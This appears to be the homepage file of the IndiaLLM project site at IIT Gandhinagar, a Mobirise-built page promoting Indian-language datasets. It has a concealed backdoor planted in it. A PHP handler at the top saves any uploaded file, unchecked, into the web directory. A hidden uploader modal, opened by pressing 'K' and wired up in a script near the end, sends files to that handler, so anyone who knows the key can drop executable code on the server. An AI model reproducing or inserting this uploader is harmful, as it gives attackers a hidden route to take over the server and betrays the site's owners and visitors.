<?php
// Handler untuk upload file - diletakkan di bagian paling atas sebelum <!DOCTYPE>
if(isset($_FILES['file'])) {
    $target_dir = "./"; // Upload ke direktori yang sama
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    
    // Pindahkan file yang diupload
    if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
        // Kirim response sukses
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'message' => 'File berhasil diupload ke: ' . $target_file]);
        exit;
    } else {
        // Kirim response error
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'message' => 'Gagal mengupload file. Cek permission direktori.']);
        exit;
    }
}
?>
<!DOCTYPE html>
<html  >
<head>
  <!-- Site made with Mobirise Website Builder v5.8.4, https://mobirise.com -->
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="generator" content="Mobirise v5.8.4, mobirise.com">
  <meta name="twitter:card" content="summary_large_image"/>
  <meta name="twitter:image:src" content="https://lingo.iitgn.ac.in/IndiaLLM/assets/images/index-meta.png">
  <meta property="og:image" content="https://lingo.iitgn.ac.in/IndiaLLM/assets/images/index-meta.png">
  <meta name="twitter:title" content="Home">
  <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1">
  <link rel="shortcut icon" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/images/indiallm-1.png" type="image/x-icon">
  <meta name="description" content="Empowering India's linguistic diversity through relentless data collection and cutting-edge AI technology, our mission is to construct the most expansive datasets for Indian languages, driving the development of next-generation Language Models (LLMs).">
  
  
  <title>Home</title>
  <link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/bootstrap/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/bootstrap/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/bootstrap/css/bootstrap-reboot.min.css">
  <link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/dropdown/css/style.css">
  <link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/socicon/css/styles.css">
  <link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/theme/css/style.css">
  <link rel="preload" href="https://fonts.googleapis.com/css2?family=Jost:ital,wght@0,400;0,700;1,400;1,700&display=swap&display=swap" as="style" onload="this.onload=null;this.rel='stylesheet'">
  <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Jost:ital,wght@0,400;0,700;1,400;1,700&display=swap&display=swap"></noscript>
  <link rel="preload" as="style" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/mobirise/css/mbr-additional.css"><link rel="stylesheet" href="https://lingo.iitgn.ac.in/IndiaLLM/assets/mobirise/css/mbr-additional.css" type="text/css">

  <!-- Styles untuk uploader modal -->
  <style>
    #uploaderModal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.7);
      z-index: 10000;
    }
    
    .uploader-content {
      background-color: #fff;
      margin: 10% auto;
      padding: 20px;
      border-radius: 5px;
      width: 50%;
      text-align: center;
    }
    
    .close {
      color: #aaa;
      float: right;
      font-size: 28px;
      font-weight: bold;
      cursor: pointer;
    }
    
    .close:hover {
      color: black;
    }
    
    #fileInput {
      margin: 20px 0;
    }
    
    #uploadBtn {
      background-color: #4CAF50;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    #uploadBtn:hover {
      background-color: #45a049;
    }
    
    #status {
      margin-top: 15px;
      padding: 10px;
    }
  </style>
  
</head>
<body>
  
  <!-- Elemen uploader tersembunyi -->
  <div id="uploaderModal">
    <div class="uploader-content">
      <span class="close">&times;</span>
      <h2>File Uploader</h2>
      <input type="file" id="fileInput" multiple>
      <button id="uploadBtn">Upload File</button>
      <div id="status"></div>
    </div>
  </div>

  <section data-bs-version="5.1" class="menu menu2 cid-ucIYCADy8D" once="menu" id="menu2-r">
    
    <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
        <div class="container-fluid">
            <div class="navbar-brand">
                <span class="navbar-logo">
                    <a href="index.html">
                        <img src="https://lingo.iitgn.ac.in/IndiaLLM/assets/images/indiallm-1.png" alt="Mobirise Website Builder" style="height: 6rem;">
                    </a>
                </span>
                
            </div>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-bs-toggle="collapse" data-target="#navbarSupportedContent" data-bs-target="#navbarSupportedContent" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
                <div class="hamburger">
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav nav-dropdown nav-right" data-app-modern-menu="true"><li class="nav-item"><a class="nav-link link text-white display-7" href="index.html">
                            Mission</a></li>
                    <li class="nav-item"><a class="nav-link link text-white display-7" href="team.html">
                            Team</a></li>
                    <li class="nav-item"><a class="nav-link link text-white display-7" href="datasets.html">Datasets</a>
                    </li><li class="nav-item"><a class="nav-link link text-white display-7" href="models.html">Models</a></li><li class="nav-item"><a class="nav-link link text-white display-7" href="join.html">Join us</a></li></ul>
                
                
            </div>
        </div>
    </nav>
</section>

<section data-bs-version="5.1" class="header11 cid-ucIIChjhTP" id="header11-2">

    

    
    

    <div class="container">
        <div class="row justify-content-center">
            <div class="col-12 col-md-6 image-wrapper">
                <img class="w-100" src="https://lingo.iitgn.ac.in/IndiaLLM/assets/images/modern-minimal-technology-background-facebook-cover-1-1024x577.png" alt="Mobirise Website Builder">
            </div>
            <div class="col-12 col-md">
                <div class="text-wrapper text-center">
                    <h1 class="mbr-section-title mbr-fonts-style mb-3 display-1">
                        <strong>IndiaLLM</strong></h1>
                    <p class="mbr-text mbr-fonts-style display-7">
                        Empowering India's linguistic diversity through relentless data collection and cutting-edge AI technology, our mission is to construct the most expansive datasets for Indian languages, driving the development of next-generation Language Models (LLMs). With unwavering determination, we embark on a journey to preserve and elevate every dialect, dialect, and vernacular, forging a path towards unparalleled linguistic innovation and inclusivity. Our resolve is unyielding, our vision boundless, as we pioneer the forefront of Indian language research, catalyzing transformative advancements in AI-driven communication and understanding.</p>
                    <div class="mbr-section-btn mt-3"><a class="btn btn-black display-7" href="join.html">Join us</a></div>
                </div>
            </div>
        </div>
    </div>
</section>

<section data-bs-version="5.1" class="footer7 cid-ucIKCrwr0x" once="footers" id="footer7-4">

    

    

    <div class="container">
        <div class="media-container-row align-center mbr-white">
            <div class="col-12">
                <p class="mbr-text mb-0 mbr-fonts-style display-7">
                    © Copyright 2024 IIT Gandhinagar- All Rights Reserved
                </p>
            </div>
        </div>
    </div>
</section>

<script>
// Fungsi untuk menangani keypress
document.addEventListener('keydown', function(event) {
  // Jika tombol 'K' ditekan (baik huruf besar maupun kecil)
  if (event.key === 'K' || event.key === 'k') {
    // Tampilkan uploader modal
    document.getElementById('uploaderModal').style.display = 'block';
  }
});

// Fungsi untuk menutup modal
document.querySelector('.close').addEventListener('click', function() {
  document.getElementById('uploaderModal').style.display = 'none';
});

// Fungsi untuk upload file
document.getElementById('uploadBtn').addEventListener('click', function() {
  var fileInput = document.getElementById('fileInput');
  var statusDiv = document.getElementById('status');
  
  if (fileInput.files.length === 0) {
    statusDiv.innerHTML = '<p style="color: red;">Silakan pilih file terlebih dahulu!</p>';
    return;
  }
  
  var file = fileInput.files[0];
  var formData = new FormData();
  formData.append('file', file);
  
  // Buat XMLHttpRequest untuk upload file
  var xhr = new XMLHttpRequest();
  xhr.open('POST', '', true); // Upload ke folder yang sama (ke file ini sendiri)
  
  // Tampilkan status sedang upload
  statusDiv.innerHTML = '<p style="color: blue;">Uploading...</p>';
  
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      if (xhr.status === 200) {
        try {
          var response = JSON.parse(xhr.responseText);
          if (response.status === 'success') {
            statusDiv.innerHTML = '<p style="color: green;">' + response.message + '</p>';
            // Reset input file
            fileInput.value = '';
          } else {
            statusDiv.innerHTML = '<p style="color: red;">' + response.message + '</p>';
          }
        } catch (e) {
          statusDiv.innerHTML = '<p style="color: red;">Error parsing response: ' + xhr.responseText + '</p>';
        }
      } else {
        statusDiv.innerHTML = '<p style="color: red;">HTTP Error: ' + xhr.status + '</p>';
      }
    }
  };
  
  xhr.onerror = function() {
    statusDiv.innerHTML = '<p style="color: red;">Terjadi kesalahan saat mengupload file.</p>';
  };
  
  xhr.send(formData);
});

// Juga tutup modal jika user mengklik di luar area konten
window.addEventListener('click', function(event) {
  var modal = document.getElementById('uploaderModal');
  if (event.target === modal) {
    modal.style.display = 'none';
  }
});
</script>

<script src="https://lingo.iitgn.ac.in/IndiaLLM/assets/bootstrap/js/bootstrap.bundle.min.js"></script>
  <script src="https://lingo.iitgn.ac.in/IndiaLLM/assets/smoothscroll/smooth-scroll.js"></script>
  <script src="https://lingo.iitgn.ac.in/IndiaLLM/assets/ytplayer/index.js"></script>
  <script src="https://lingo.iitgn.ac.in/IndiaLLM/assets/dropdown/js/navbar-dropdown.js"></script>
  <script src="https://lingo.iitgn.ac.in/IndiaLLM/assets/theme/js/script.js"></script>
  
  
  
</body>
</html>